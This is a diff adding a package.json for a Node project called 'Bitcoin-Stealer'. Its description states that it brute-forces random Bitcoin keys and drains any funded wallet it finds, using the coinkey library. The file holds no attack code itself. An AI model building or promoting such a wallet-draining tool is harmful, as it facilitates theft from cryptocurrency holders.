@@ -1,0 +1,21 @@
+{
+  "name": "Bitcoin-Stealer",
+  "version": "1.0.0",
+  "description": "Generate random bitcoin wallets & private keys (seeds) and then check if they match any wallet that has a positive balance, and then take all the btc from it.",
+  "main": "generator.js",
+  "scripts": {
+    "test": "echo \"Error: no test specified\" && exit 1"
+  },
+  "keywords": [
+    "bitcoin",
+    "crypto",
+    "bruteforce",
+    "btc",
+    "wallets"
+  ],
+  "author": "Michal2SAB",
+  "license": "ISC",
+  "dependencies": {
+    "coinkey": "^3.0.0"
+  }
+}
